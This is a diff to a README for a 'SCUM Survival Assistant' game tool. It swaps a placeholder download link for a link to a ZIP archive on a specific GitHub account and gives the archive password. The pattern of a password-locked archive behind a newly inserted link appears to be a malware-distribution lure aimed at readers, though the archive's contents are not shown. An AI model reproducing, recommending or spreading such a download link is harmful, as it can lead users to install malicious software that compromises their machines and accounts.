@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/SCUM-Survival-Assistant/releases/latest/download/SCUM-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/kevinivanov-hq1989z4/SCUM-Survival-Assistant/releases/download/download/SCUM_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
